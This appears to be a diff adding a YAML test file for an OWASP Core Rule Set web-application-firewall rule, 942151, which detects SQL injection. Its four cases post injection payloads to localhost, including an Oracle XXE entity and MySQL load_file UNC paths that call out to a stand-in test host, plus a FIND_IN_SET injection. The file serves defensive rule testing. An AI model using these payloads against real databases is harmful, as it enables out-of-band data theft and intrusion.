@@ -1,0 +1,75 @@
+---
+meta:
+  author: "Christian Folini,azurit"
+  description: Various SQL injection tests
+  enabled: true
+  name: 942151.yaml
+tests:
+  - test_title: 942151-1
+    desc: "Advanced SQL injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=foo'||(select extractvalue(xmltype('<?xml version=\"1.1\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % tocob SYSTEM \"https://unit'||'tests.coreruleset.org/\">%tocob;"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-2
+    desc: "Simple SQL injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=/config.txt' (select load_file('\\\\\\\\unittests.coreruleset.org\\\\zow')) '"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-3
+    desc: "Advanced SQL injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=(select load_file('\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\unitests.corerule'||'set.org\\\\\\\\\\\\\\\\hvs'))"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-4
+    desc: "Simple injection using 'fetch_in_set'"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=, FIND_IN_SET('22', Category )"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
